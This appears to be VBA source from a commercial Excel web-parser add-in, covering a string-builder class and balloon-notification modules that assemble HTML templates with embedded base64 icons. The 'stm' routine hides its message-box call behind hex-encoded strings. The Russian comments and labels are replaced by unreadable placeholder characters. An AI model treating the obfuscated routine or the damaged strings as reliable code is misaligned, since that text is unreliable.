    CopyMemory ByVal UnsignedAdd(StrPtr(m_sString), m_iPos), ByVal StrPtr(sThis), lLen
    m_iPos = m_iPos + lLen
End Sub

Public Sub AppendByVal(ByVal sThis As String)
    Append sThis
End Sub

Public Sub Insert(ByVal iIndex As Long, ByRef sThis As String)
    #If Win64 Then
        Dim lPos As LongPtr
    #Else
        Dim lPos As Long
    #End If
    Dim lLen As Long
    Dim lSize As Long

    ' is iIndex within bounds?
    If (iIndex * 2 > m_iPos) Then
        Err.Raise 9
    Else

        lLen = LenB(sThis)
        If (m_iPos + lLen) > m_iLen Then
            m_sString = m_sString & Space$(m_iChunkSize \ 2)
            m_iLen = m_iLen + m_iChunkSize
        End If

        ' Move existing characters from current position
        lPos = UnsignedAdd(StrPtr(m_sString), iIndex * 2)
        lSize = m_iPos - iIndex * 2

        ' moving from iIndex to iIndex + lLen
        CopyMemory ByVal UnsignedAdd(lPos, lLen), ByVal lPos, lSize

        ' Insert new characters:
        CopyMemory ByVal lPos, ByVal StrPtr(sThis), lLen

        m_iPos = m_iPos + lLen
    End If
End Sub

Public Sub InsertByVal(ByVal iIndex As Long, ByVal sThis As String)
    Insert iIndex, sThis
End Sub

Public Sub Remove(ByVal iIndex As Long, ByVal lLen As Long)
    #If Win64 Then
        Dim lSrc As LongPtr
        Dim lDst As LongPtr
    #Else
        Dim lSrc As Long
        Dim lDst As Long
    #End If
    Dim lSize As Long

    ' is iIndex within bounds?
    If (iIndex * 2 > m_iPos) Then
        Err.Raise 9
    Else
        ' is there sufficient length?
        If ((iIndex + lLen) * 2 > m_iPos) Then
            Err.Raise 9
        Else
            ' Need to copy characters from iIndex*2 to m_iPos back by lLen chars:
            lSrc = UnsignedAdd(StrPtr(m_sString), (iIndex + lLen) * 2)
            lDst = UnsignedAdd(StrPtr(m_sString), iIndex * 2)
            lSize = (m_iPos - (iIndex + lLen) * 2)
            CopyMemory ByVal lDst, ByVal lSrc, lSize
            m_iPos = m_iPos - lLen * 2
        End If
    End If
End Sub

Public Function Find(ByVal sToFind As String, _
                     Optional ByVal lStartIndex As Long = 1, _
                     Optional ByVal compare As VbCompareMethod = vbTextCompare _
                   ) As Long

    Dim lInstr As Long
    If (lStartIndex > 0) Then
        lInstr = InStr(lStartIndex, m_sString, sToFind, compare)
    Else
        lInstr = InStr(m_sString, sToFind, compare)
    End If
    If (lInstr < m_iPos \ 2) Then
        Find = lInstr
    End If
End Function

Public Sub HeapMinimize()
    Dim iLen As Long

    ' Reduce the string size so only the minimal chunks
    ' are allocated:
    If (m_iLen - m_iPos) > m_iChunkSize Then
        iLen = m_iLen
        Do While (iLen - m_iPos) > m_iChunkSize
            iLen = iLen - m_iChunkSize
        Loop
        m_sString = Left$(m_sString, iLen \ 2)
        m_iLen = iLen
    End If

End Sub

#If Win64 Then
Private Function UnsignedAdd(Start As LongPtr, Incr As Long) As LongPtr
#Else
Private Function UnsignedAdd(Start As Long, Incr As Long) As Long
#End If
' This function is useful when doing pointer arithmetic,
' but note it only works for positive values of Incr

If Start And &H80000000 Then        'Start < 0
    UnsignedAdd = Start + Incr
ElseIf (Start Or &H80000000) < -Incr Then
    UnsignedAdd = Start + Incr
Else
    UnsignedAdd = (Start + &H80000000) + (Incr + &H80000000)
End If

End Function

Private Sub Class_Initialize()
    ' The default allocation: 8192 characters.
    m_iChunkSize = 16384
End Sub

Attribute VB_Name = "modBALLOON"
'---------------------------------------------------------------------------------------
' Module        : modBALLOON
' Author        : EducatedFool                     Date: 17.01.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
' Part of code by Chip Pearson, chip@cpearson.com, www.cpearson.com
' URL: http://www.cpearson.com/Excel/FormControl.aspx
'---------------------------------------------------------------------------------------

Option Compare Text: Option Private Module

Public Enum BALLOON_TYPES
    bt_Text = 0
    bt_Warning = 1
    bt_Information = 2
    bt_Attention = 3
    bt_CookieAdd = 4
    bt_CookieDelete = 5
    bt_Redirect = 6
End Enum

Public BalloonMessages As New Collection

Sub AddBalloon(ByVal txt$, Optional ByVal BalloonType As BALLOON_TYPES, Optional HideDuplicates As Boolean, Optional ByVal HelpURL$)
    On Error Resume Next
    Dim htxt$, ExternalStart As Boolean, ParserInfo$

    If HideDuplicates Then
        Err.Clear
        BalloonMessages.Add 1, CStr(txt)
        If Err.Number Then Exit Sub
    End If

    Select Case BalloonType
        Case bt_Warning: styleinfo$ = " class=""warning"""
        Case bt_Information: styleinfo$ = " class=""info"""
        Case bt_Attention: styleinfo$ = " class=""attention"""
        Case bt_CookieAdd: styleinfo$ = " class=""cookie-add"""
        Case bt_CookieDelete: styleinfo$ = " class=""cookie-delete"""
        Case bt_Redirect: styleinfo$ = " class=""redirect"""
    End Select

    ExternalStart = RunningParser.ExternalStart
    If ExternalStart Then ParserInfo$ = "<u>|fffd||fffd||fffd||fffd||fffd||fffd| <b>" & RunningParser.Name & "</b></u><br />"

    htxt$ = "<p" & styleinfo$ & ">" & ParserInfo$ & Replace(txt$, vbNewLine, "<br />") & "</p>"
    If Len(HelpURL$) Then
        If InStr(1, HelpURL$, "manuals/") > 0 Then HelpURL$ = "https://excelvba.ru/programmes/Parser/manuals/" & Split(HelpURL$, "manuals/", 2)(1)
        htxt$ = htxt$ & "<br /><p class='error-help-link'>" & CreateHTMLlink(HelpURL$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|") & "</p>"
    End If

    With F_Balloon
        .Show
        .Items.Add htxt$
        .DisplayAllItems
    End With
End Sub

Function CreateHTMLlink(ByVal URL$, Optional ByVal txt$) As String
    On Error Resume Next: If txt = "" Then txt = URL$
    If Len(URL$) Then CreateHTMLlink = "<a href=""" & URL$ & """>" & txt & "</a>"
End Function

Sub stm()
    On Error Resume Next
    Dim dic As New Dictionary, res$
    If Val(grv(Join(Array("", "F", "B"), "6"))) Then Exit Sub
    Application.EnableCancelKey = 0
    With SETT
        dic.item(.U("5469746C65")) = .U(GetTextFromSheet(URLerrors, "t"))
        dic.item(.U("427574746F6E73")) = 2 ^ 6
        res$ = .U(GetTextFromSheet(URLerrors, "m"))
        ApplyNormalActionToText res$, .U("4D7367426F78"), dic
    End With
End Sub

Function CreateHTMLfromTemplate(ByVal htxt$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    res$ = GetBalloonTemplate

    If SETT.GetBoolean("CheckBox_ScrollBalloonWindow") Then res$ = Replace(res$, "scroll=no", "style='max-width: 300px; word-wrap: break-word; font-family: Verdana; font-size: 11px;'")
    res$ = Replace(res$, "%content%", htxt$ & "<br />")
    tmp_file$ = Environ("tmp") & "\balloon.html": Kill tmp_file$

    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.CreateTextFile(tmp_file$, True, True)
    ts.Write res$: ts.Close
    Set ts = Nothing: Set FSO = Nothing
    CreateHTMLfromTemplate = tmp_file$
End Function

Function CreateHTMLFileforCaptchaDialog(ByVal htxt$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim tmp_file$
    tmp_file$ = FWF.temp_filename & ".html": Kill tmp_file$

    Set FSO = CreateObject("scripting.filesystemobject")
    Set ts = FSO.CreateTextFile(tmp_file$, True, True)
    ts.Write htxt$: ts.Close
    Set ts = Nothing: Set FSO = Nothing
    CreateHTMLFileforCaptchaDialog = tmp_file$
End Function


'Declare Function GetSysColor Lib "user32" (ByVal nIndex As Long) As Long
'Const COLOR_ACTIVECAPTION = 2, COLOR_INACTIVECAPTION = 3        'Caption of Inactive window
'
'Function GetUserformColor() As String
'    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    Const COLOR_ACTIVECAPTION = 2, COLOR_INACTIVECAPTION = 3
'    Dim MyClr As Long, R As Byte, G As Byte, B As Byte
'    On Error Resume Next
'
'    MyClr = GetSysColor(COLOR_ACTIVECAPTION)
'    B = Int(MyClr / (256 ^ 2))
'    G = Int((MyClr - B * 256 ^ 2) / (256))
'    R = Int(MyClr - B * 256 ^ 2 - G * 256)
'
'    GetUserformColor = IIf(R < 16, "0", "") & Hex(R) & IIf(G < 16, "0", "") & Hex(G) & IIf(B < 16, "0", "") & Hex(B)
'End Function

'Function ShowTitleBar(UF As MSForms.UserForm, HideTitle As Boolean) As Boolean
'    On Error Resume Next
'    UFHWnd = HWndOfUserForm(UF)
'    If UFHWnd = 0 Then Exit Function
'
'    WinInfo = GetWindowLong(UFHWnd, GWL_STYLE)
'
'    If HideTitle = False Then
'        WinInfo = WinInfo Or WS_CAPTION        ' turn on the Caption bit
'    Else
'        WinInfo = WinInfo And (Not WS_CAPTION)        ' turn off the Caption bit
'    End If
'    R = SetWindowLong(UFHWnd, GWL_STYLE, WinInfo)
'    ShowTitleBar = (R <> 0)
'End Function
'
'
'Function MakeFormResizable(UF As MSForms.UserForm) As Boolean
'    On Error Resume Next
'
'    UFHWnd = HWndOfUserForm(UF)
'    If UFHWnd = 0 Then Exit Function
'
'    WinInfo = GetWindowLong(UFHWnd, GWL_STYLE)
'    WinInfo = WinInfo Or WS_SIZEBOX
'
'    R = SetWindowLong(UFHWnd, GWL_STYLE, WinInfo)
'    MakeFormResizable = (R <> 0)
'
'End Function
'
'Function SetFormOpacity(UF As MSForms.UserForm, Opacity As Byte) As Boolean
'    On Error Resume Next
'
'    UFHWnd = HWndOfUserForm(UF)
'    If UFHWnd = 0 Then Exit Function
'
'    WinL = GetWindowLong(UFHWnd, GWL_EXSTYLE)
'    If WinL = 0 Then Exit Function
'
'    Res = SetWindowLong(UFHWnd, GWL_EXSTYLE, WinL Or WS_EX_LAYERED Or WS_EX_TOOLWINDOW)
'    If Res = 0 Then Exit Function
'
'    Res = SetLayeredWindowAttributes(UFHWnd, 0, Opacity, LWA_ALPHA)
'    SetFormOpacity = Res = 0
'End Function
'
'
'Function HWndOfUserForm(UF As MSForms.UserForm)
'    On Error Resume Next
'    ' First, look in top level windows
'    UFHWnd = FindWindow(C_USERFORM_CLASSNAME, UF.Caption)
'    If UFHWnd <> 0 Then HWndOfUserForm = UFHWnd: Exit Function
'
'    ' Not a top level window. Search for child of application.
'    UFHWnd = FindWindowEx(Application.hwnd, 0&, C_USERFORM_CLASSNAME, UF.Caption)
'    If UFHWnd <> 0 Then HWndOfUserForm = UFHWnd: Exit Function
'
'    'MsgBox " Not a child of the application."
'End Function
Attribute VB_Name = "modBALLOONtemplate"
'---------------------------------------------------------------------------------------
' Module        : modBALLOONtemplate                    Version:
' Author        : Igor Vakhnenko                   Date: 01.06.2018
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------
Option Compare Text: Option Private Module

Function GetBalloonTemplate2() As String
    On Error Resume Next

    res$ = "5EAEGc0Mnn3AACTv/mPQCsBAM2XpOMAALzoGFyolBdMxggAAESggSqwQQcMwRSswA6cwR28wBcCYQZEQAwkwDwQQgbkgBwKoRiWQRlUwDrYBLWwAxqgEZrhELTBMTgN5+ASXIHrcBcGYBiewhi8hgkEQcgIE2EhOogRYo7YIs4IF5mOBCJhSDSSgKQg6YgUUSLFyHKkAqlCapFdSCPyLXIUOY1cQPqQ28ggMor8irxHMZSBslED1AJ1QLmoHxqKxqBz0XQ0D12AlqJr0Rq0Hj2AtqKn0UvodX" & _
           "QAfYqOY4DRMQ5mjNlhXIyHRWCJWBomxxZj5Vg1Vo81Yx1YN3YVG8CeYe8IJAKLgBPsCF6EEMJsgpCQR1hMWEOoJewjtBK6CFcJg4Qxwicik6hPtCV6EvnEeGI6sZBYRqwm7iEeIZ4lXicOE1+TSCQOyZLkTgohJZAySQtJa0jbSC2kU6Q+0hBpnEwm65Btyd7kCLKArCCXkbeQD5BPkvvJw+S3FDrFiOJMCaIkUqSUEko1ZT/lBKWfMkKZoKpRzame1AiqiDqfWkltoHZQL1OHqRM0dZolzZs"

    res$ = res$ & "WQ8ukLaPV0JppZ2n3aC/pdLoJ3YMeRZfQl9Jr6Afp5+mD9HcMDYYNg8dIYigZaxl7GacYtxkvmUymBdOXmchUMNcyG5lnmA+Yb1VYKvYqfBWRyhKVOpVWlX6V56pUVXNVP9V5qgtUq1UPq15WfaZGVbNQ46kJ1Bar1akdVbupNq7OUndSj1DPUV+jvl/9gvpjDbKGhUaghkijVGO3xhmNIRbGMmXxWELWclYD6yxrmE1iW7L57Ex2Bfsbdi97TFNDc6pmrGaRZp3mcc0BDsax4PA52ZxKziHO" & _
           "Dc57LQMtPy2x1mqtZq1+rTfaetq+2mLtcu0W7eva73VwnUCdLJ31Om0693UJuja6UbqFutt1z+o+02PreekJ9cr1Dund0Uf1bfSj9Rfq79bv0R83MDQINpAZbDE4Y/DMkGPoa5hpuNHwhOGoEctoupHEaKPRSaMnuCbuh2fjNXgXPmasbxxirDTeZdxrPGFiaTLbpMSkxeS+Kc2Ua5pmutG003TMzMgs3KzYrMnsjjnVnGueYb7ZvNv8jYWlRZzFSos2i8eW2pZ8ywWWTZb3rJhWPlZ5VvVW16" & _
           "xJ1lzrLOtt1ldsUBtXmwybOpvLtqitm63Edptt3xTiFI8p0in1U27aMez87ArsmuwG7Tn2YfYl9m32zx3MHBId1jt0O3xydHXMdmxwvOuk4TTDqcSpw+lXZxtnoXOd8zUXpkuQyxKXdpcXU22niqdun3rLleUa7rrStdP1o5u7m9yt2W3U3cw9xX2r+00umxvJXcM970H08PdY4nHM452nm6fC85DnL152Xlle+70eT7OcJp7WMG3I28Rb4L3Le2A6Pj1l+s7pAz7GPgKfep+Hvqa+It89viN+"

    res$ = res$ & "1n6Zfgf8nvs7+sv9j/i/4XnyFvFOBWABwQHlAb2BGoGzA2sDHwSZBKUHNQWNBbsGLww+FUIMCQ1ZH3KTb8AX8hv5YzPcZyya0RXKCJ0VWhv6MMwmTB7WEY6GzwjfEH5vpvlM6cy2CIjgR2yIuB9pGZkX+X0UKSoyqi7qUbRTdHF09yzWrORZ+2e9jvGPqYy5O9tqtnJ2Z6xqbFJsY+ybuIC4qriBeIf4RfGXEnQTJAntieTE2MQ9ieNzAudsmjOc5JpUlnRjruXcorkX5unOy553PFk1WZB8OI" & _
           "WYEpeyP+WDIEJQLxhP5aduTR0T8oSbhU9FvqKNolGxt7hKPJLmnVaV9jjdO31D+miGT0Z1xjMJT1IreZEZkrkj801WRNberM/ZcdktOZSclJyjUg1plrQr1zC3KLdPZisrkw3keeZtyhuTh8r35CP5c/PbFWyFTNGjtFKuUA4WTC+oK3hbGFt4uEi9SFrUM99m/ur5IwuCFny9kLBQuLCz2Lh4WfHgIr9FuxYji1MXdy4xXVK6ZHhp8NJ9y2jLspb9UOJYUlXyannc8o5Sg9KlpUMrglc0lamU"

    res$ = res$ & "ycturvRauWMVYZVkVe9ql9VbVn8qF5VfrHCsqK74sEa45uJXTl/VfPV5bdra3kq3yu3rSOuk626s91m/r0q9akHV0IbwDa0b8Y3lG19tSt50oXpq9Y7NtM3KzQM1YTXtW8y2rNvyoTaj9nqdf13LVv2tq7e+2Sba1r/dd3vzDoMdFTve75TsvLUreFdrvUV99W7S7oLdjxpiG7q/5n7duEd3T8Wej3ulewf2Re/ranRvbNyvv7+yCW1SNo0eSDpw5ZuAb9qb7Zp3tXBaKg7CQeXBJ9+mfHvjUO" & _
           "ihzsPcw83fmX+39QjrSHkr0jq/dawto22gPaG97+iMo50dXh1Hvrf/fu8x42N1xzWPV56gnSg98fnkgpPjp2Snnp1OPz3Umdx590z8mWtdUV29Z0PPnj8XdO5Mt1/3yfPe549d8Lxw9CL3Ytslt0utPa49R35w/eFIr1tv62X3y+1XPK509E3rO9Hv03/6asDVc9f41y5dn3m978bsG7duJt0cuCW69fh29u0XdwruTNxdeo94r/y+2v3qB/oP6n+0/rFlwG3g+GDAYM/DWQ/vDgmHnv6U/9OH" & _
           "4dJHzEfVI0YjjY+dHx8bDRq98mTOk+GnsqcTz8p+Vv9563Or59/94vtLz1j82PAL+YvPv655qfNy76uprzrHI8cfvM55PfGm/K3O233vuO+638e9H5ko/ED+UPPR+mPHp9BP9z7nfP78L/eE8/sl0p8zAAAABGdBTUEAALGOfPtRkwAAACBjSFJNAAB6JQAAgIMAAPn/AACA6QAAdTAAAOpgAAA6mAAAF2+SX8VGAAAB8ElEQVR42pSRPWsUURSGn/nYmJCYqCEgRCJWC0JqwWYrO8FKTBObQER"

    GetBalloonTemplate2 = res
End Function

Function GetBalloonTemplate3() As String
    On Error Resume Next
    res$ = res$ & "/gP/AKr/AoCBYamMRENNobAU7bUTBsImY7O7Mzr1zZ+aee69FsiIhovtWh8P7nPdwTnTz9kcuL02yMD/B9HQyFcfcFwnrde3bpvJo7VDaUSh5l+fydJDZ51ku5ENBa0d6afEMC/MTzMwky0kSvRIJV4zxFEpQ2lGWjtI4ytJ3TOU7dePXrA0rzoUfPgTS8+daTE7Gy8D7uvZzw0Lo9S39gUUph6kcIgFrA6ZyKOU6unRvS+OuVZXP01YrmvA+vDDGz+VDYW+/Zrdbc3DY8PnDdQAW2zvEcYT3AWM" & _
           "8unTtpvGPgZVUJKyX3reVErr7NV++lnT3agoljPTzoCFJIgDq2o/ad4CN1Bi/LuLp9S3fdyu6ezVZLljriWa3fw9xLhACJ7WaFkquGuM57FkOew2FOoJDgDC8AUA0u30aDNBJh4UkWjuy/OjqTRP+Zj5NS2meC7p0KC00TcD7/6eBJs1yMaVxU1ofvSuMxfMpHmT29SATCuWoaseY2ooHmWxkmWWQWawdK74PPItaF7axNjwB1sZMvwdsxsepD4CtMeANYBMgHl0TuAU8Asw/1r4LPBw1Is6+OWm" & _
           "6CKwCneMa4Nvxhi8B9af51wA04UO3Ud1QxgAAAABJRU5ErkJggg==') 4px 4px no-repeat;margin: 0;  padding: 0 0 0 28px;border: none;}" & vbNewLine

    res$ = res$ & ".cookie-add {background: url('data:image;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5cc" & _
           "llPAAAAtNJREFUeNqkU0lMU1EUPb90sFCl8GtHoAxFBCKDQEEEAzEqOISQaKILDSaGraw0Lt26cKcLXbgQN0Zj4gIiCwRawxCrCBiCMhNrCy1Qa1v6+wff+60ocenNP++/3HvOfffmvsdIkoT/MSVd+q4qoUxjoFQA5MtmGDQQdwmBIcULEMyRs8ZEYJMnCy9IfxL8Zc407YGL5iPNTra4tkSjy2KpM/5zKxj8+n7ON+2aEGM/XhDXxJ4KUtagOmC8Udre3aEz5RjUWi0USiXc7ndobKg3p7MWc1" & _
           "ZBdfls/6NsfnudFIoxKqIbkGJYqDOuOE5e79CZcw2+QBBcLIbo1hacNUflPfXRGOVQLtWIUioBL6CFddQ5tdlGg9fnx9MnvViaX4SQSCAeDsM14pZ9NEY5lEs1gphKwImoyrQddtCyjfpMdJ5vh8V0EALPy6irrpRBY5RDuVTD/U6QEKRchSZDzygU4HZ2kF+Uvyt2j4zL/6YTjXLMNTQKrd6gpxqCVAU81CqVihnsH5LJ0VAoKR4eh2twHMuLa7u+481OiILAUA1BcgqcgEA0vB1ubKrR01NWFt"

    res$ = res$ & "aQa7fAWV8Ji9kIqzXZzm3uLaZCGyiKqBJnBPlupFoQpcmlzx/84c1NrC59w7PHr7A8vyaLCovtyXYEAVNxP+pa2/Ax4Zc1r0v2JStICOhbmJ3stBaW2cwmi+5y1wXk5JloqYiSKdyJDmNG2CDzlhASQohEovGezqybpIN6uQIyT18sFnvofvNyKrj+PVJQlCOLXQMToG9lOuIDe6oM7OlyBPgAyi+1Zjafa6lAXKxhKOF+mwJ0prwonVVrtD2FpZWH7I5S1mi2pZPEuLU+wE/u+BHlYnFjV9X+mee" & _
           "fPPLdZeDZk4D0BVGElVywThI+RpCXuuarBKN3W3Tdpmv2Cm/vigcqphZK5p/HRM1LEjxAEntMCHAV3ntfEkTooWLYNPglwABddGeEt7xfHwAAAABJRU5ErkJggg==') 4px 4px no-repeat;margin: 0;  padding: 0 0 0 28px;border: none;}" & vbNewLine

    res$ = res$ & ".cookie-delete {background: url('data:image;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAqRJREFUeNqkU0tPE1EYPTP0kYEGSltLeb+KSIxWRAoWMBiDWjUhBF1o4sLEuPaXGBfGGFkYUXcaEhcQE0OAlvAIGhNjCLE8BKkdA+XROkOnM3e8dzqgrLnpmU6+75wz5879htN1HUdZFnYZvmuBJY+DhQfoz8VxaKflRgqPydugWK" & _
           "DPmiZAUqUXVdP/Gfy3gnlC4U3fqa6gu+Fco91R7GbFTHprc/P73ELia2SWyLtvaWn2UAJztVsLvfebwg96HSUVHpsggLdYEI1OItTe5st3l/qKa5tPzo88d6nbv2lQTDMRuwEN44at4Lb/0r1eh6/Sk9jYhCLLkLa2EGw5a9yzGusxDuMyDdFNA1VDt9vfGhRcXk88IeLVi9dYji1By2aRSaUQmYgaNdZjHMZlGo2YBgrBmaLyE34W2+ssQt+NMEpLjkFTVQOtzQEDrMc4jMs0yr5BVtMreXuBk+N"

    res$ = res$ & "5KHt7qKmvORBHJ2aM/84LIaMXGZuC4PQ4mYbCTKDCZrVaudGRMYMs7ezkxOMziIzOYGVp7aDW0RUE0TSOaShMAw0bUmo7FepsASEEK4trBjnYFkD/rTDKynLbYWZyOo1tMZ5iGgpzC0T/svzts5hKJrG6vI43A0NYieVM6hqqc9vRNFy83AF5dxfrS/Mi01gXdHBslB+HeZ/VLgx0Xb/TXewtdfxcFVFRVYL9MV98NgxpMcGOG6qiECmZTPES+aETTBuDRM8zIcvy0+iHd67Qlf5AbX1VQYa+sOjH" & _
           "OXT2tCIR+4W+jp79gWOpiyhOvxwczBoJHl3lwc5UJfo1m114WNcUOF7tb3J7feX51BiTT96rYiwORZIzJENEZLFjjvGnQwZ0X/QlooxG7aP98xRV5lNXKaY4YOjPOOI0urEECu6on/NfAQYAghtjz9rayCAAAAAASUVORK5CYII=') 4px 4px no-repeat;margin: 0;  padding: 0 0 0 28px;border: none;}" & vbNewLine

    res$ = res$ & ".redirect {background: url('data:image;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAABIAAAASABGyWs+AAAACXZwQWcAAAAQAAAAEABcxq3DAAACz0lEQVQ4y42S20uUeRzGP+9p3jk42atN62F3yAKlIJa0JNjOhm3RRbAUIUGBF7sQ3QQF/QXLXi5BXkVHiYJuig4GuxUylm1m2tTqOM44zqD5NqPjnKfXd94uHEHCoAce+P4uvh8evr8HVtD" & _
           "uUyOnf/9z8ulP2y62AE5A4BuSlz/aOv9z1dZ5zu7d4znndsruh3f0dmAOiALGSgBpaTh0Jti+Y2ddd9u+mg5vvU01DQs9Ltb93PqrJmjH7ZtbDqTC7+/lAWs5QNh0+G3jlhbtfNv+2s4fPAoioAigKiBjIVFCskxr5mMuMfBmqu9Z34er/9w6+gTIAyVpz28Xuk6c9J5w2CVKJkgCyCIoEjhVAbdTpLpSEprW2Z1t2z1NW7duODbLLy7/y+5BoCipazuaV1VqOzweBVVhMYG0aFvZatmyBI4KWXDX" & _
           "N2z3j9cKeujBkCRXNM+HIs4j+YLsqq5S0VaL2GQoFCyicYH5LCRSUFqwcNkEMgboBZGRQK46+PqqT0pNPUiYRvrVbNLVkDU0rywrQvVqCVUWuPconJ2IJQsx3WT8k00O6SIzcxa5zxYD/WPp0OCNfgko5efexeOh2775tD2dXahpFGyrXHanwrVLVwZ7rv1xd8j3uC8Sik3p6Zp60VHlSKUtgv+HkpHhm71L32gAqdR0r38q+KxPT1RWuNfWewPv/BMfA3d6itlJ32ys31fV0HGgUJTXaFoFkVB0P"

    res$ = res$ & "jJ8/elSkSygAExnZ0fSgw87J8LDB+8XM1EVCDfu63buat/9V7EoNEWj+cWNklkCLPmrYplACsglY48SgBvIeeo2dq5rqGwNBLJsa60llzUYHbg9BBS/BiylMYB4ucaWaZZkUFi/QWPsw3ji37t/v5wZvdwLxFYCLActAGSS+usXzwfuh/09mbFXXUGj8GkSGAXGBb5PDsAL/FhONw3oQOZ7ASJgB9Ryqnz5XtYX3OUs/e30iPkAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTAtMDItMTBUMDE6MTg6MDA" & _
           "tMDY6MDB1lmgNAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDA0LTA0LTI1VDE2OjA3OjM4LTA1OjAwCCqh7QAAAABJRU5ErkJggg==') 4px 4px no-repeat;margin: 0;  padding: 0 0 0 28px;border: none;}" & vbNewLine & _
           "</style>" & vbNewLine & "</head>" & vbNewLine & "<body scroll=no>" & vbNewLine & "%content%" & vbNewLine & "</body>" & vbNewLine & "</html>"

    GetBalloonTemplate3 = res
End Function

Function GetBalloonTemplate() As String
    GetBalloonTemplate = GetBalloonTemplate1 & GetBalloonTemplate2 & GetBalloonTemplate3
End Function

Function GetBalloonTemplate1() As String
    On Error Resume Next
    res$ = "<!DOCTYPE HTML PUBLIC '-//W3C//DTD HTML 4.01//EN' 'http://www.w3.org/TR/html4/strict.dtd'>" & vbNewLine & _
           "<html>" & vbNewLine & "<head>" & vbNewLine & "<meta http-equiv='Content-Type' content='text/html; charset=utf-8'>" & vbNewLine & _
           "<style type='text/css'>" & vbNewLine & "body {background-color: #fff; margin:0; padding-top:4px;}" & vbNewLine & _
           "p {margin: 0; padding-left:0.5em; min-height: 22px; overflow: hidden;}" & vbNewLine & "red {color: red;}" & vbNewLine & "hr {margin: 0; padding:0;} " & vbNewLine
    res$ = res$ & "p.error-help-link a {color: red !important; padding-left: 2em; font-weight: bold;}" & vbNewLine

    res$ = res$ & ".attention {background: url('data:image;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACyUlEQVR42l2TXUhTYRjHn9ezs5mbbfNj1tjWcDJzSmJBxLCY9mHQRRdSXgdBkXgTeDOLiHI30kXpQIi8CCKKvOgiyoo2SiS6SCQ/UtJOO2s5Z9vZcGs729npPefdVx144PC+7//3/78fD4L/PvbJUXsuVT2k0Jh7aZ2+WRrLcrENIcm+o3alx80DH9Yq16Piz/abw+qd0G63tr3HrXWYAYmLAPlN" & _
           "Mlm1B0TUAfFlFuKLPk+tOeGpP/4pWQJsvzxUwzGmOUv/6U6amsaWPjwjlPGiVBQA3QNZoR8C068W9LaAs/7UfEpewky5Ro19fW46P4YXRrEjHlRagZ09KOvN3Z8BeAYnkizrIFs1DKHXMx7rBf8ICj7ssqtbTq7qmh7g2d/EVQLUuODF+Y8y4MzTIwApPwFIaaAOuPBF+PN9phUx949NWFzUIOJ9RFgsjQveXl6UAScmOwB2CoBCicoeYN/nvIh9NLBkan3mAIVQFlMEMHudkQHdt6wEIJQBkK" & _
           "MguHpuGYUfO9OGfXMqUBSERchuF8yPx2RA15AeIFGRQALlALZ+ODMoPGVLG6zrKqDxoKICoHPB2vMqGWA/i1VcBSAnPQ4MYGwZxE60LZmaVxwygK7YgtoKXLRPBujqZgCSTHkLWVLBjbZlxNw9MGExfRlEKpEkKKZQSoftIu8git35CndcYgYB+7PDi4LeFruaSqzq9FtQSiFBDPgWbiyRW7jZjvP6S9Gl4mIGSOU1reQh3XGMGrXf3HQ1T8QSZC8G3C4ArmHALz8RY0g2rYRQwuaxXl0ZkQGR"

    res$ = res$ & "SWNNPNo4Z9GtdNJKngBUuJoKWwhjcYY4Z3klBLi2BV192NlwaTNVaqaI16hOpvRuLYq4tcoIIEokhwnk2kQBQZxvBC7f6KnVxDwNV0LlZqr8AmP77YKgGFLk+V4apW1yO4vV67kqlY+isvcsw1//aee/QqsU1CGz1MYAAAAASUVORK5CYII=') 4px 4px no-repeat;margin: 0;    padding: 0 0 0 28px;border: none;}" & vbNewLine & _
           ".warning {background: url('data:image;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAC4jAAAuIwF4pT92AAAA2UlEQVR42mNgQAMPHNgUgLgViE8C8UsoBrHbgViJARcASrJAFf0E4v848G8g7gSpxaZ5PZri70B8FYq/o8mtRzEEaiq6bReR5C9ike+GSapAnUaqASA9aiDJbhz+JWQAxBVA4jwFBpwHSX6kwICPlBrwGSR5GYckSJwPinGqARkwEU/CIYQnggzQAuK/WCS/A" & _
